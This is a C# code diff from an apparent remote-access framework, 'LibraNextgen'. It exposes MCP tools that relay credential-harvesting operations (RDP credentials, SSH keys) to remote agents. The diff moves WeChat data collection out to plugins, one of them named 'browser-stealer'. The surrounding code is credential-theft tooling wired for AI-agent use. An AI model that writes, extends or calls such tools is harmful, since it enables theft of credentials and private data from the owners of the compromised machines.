@@ -5,9 +5,10 @@ using Microsoft.AspNetCore.Http;
 
 namespace LibraNextgen.Service.Mcp;
 
-/// <summary>Credential-focused tools: RDP, SSH keys, WeChat accounts.
-/// QQ functionality lives in the qqkey plugin. All credential tools require
-/// an Admin access key.</summary>
+/// <summary>Credential-focused tools: RDP, SSH keys.
+/// QQ functionality lives in the qqkey plugin; WeChat/browser data now live in
+/// their own plugins (com.libra.wechat-file / com.libra.browser-stealer).
+/// All credential tools require an Admin access key.</summary>
 [McpServerToolType]
 public sealed class CredTools
 {
@@ -41,21 +42,5 @@ public sealed class CredTools
 
         return await McpUtils.RelayOrError(relay, agents, caller, agentId, "creds",
             new { op = "ssh" }, ct, TimeSpan.FromSeconds(30));
-    }
-
-    [McpServerTool, Description("List WeChat account data directories on an agent (requires Admin)")]
-    public static async Task<string> get_wechat_data(
-        IHttpContextAccessor http,
-        RelayService relay,
-        AgentService agents,
-        [Description("Target agent ID")] string agentId,
-        CancellationToken ct = default)
-    {
-        var caller = McpUtils.GetCaller(http);
-        var adminError = McpUtils.RequireAdmin(caller, "get_wechat_data");
-        if (adminError.Length > 0) return adminError;
-
-        return await McpUtils.RelayOrError(relay, agents, caller, agentId, "creds",
-            new { op = "wechat" }, ct, TimeSpan.FromSeconds(30));
     }
 }
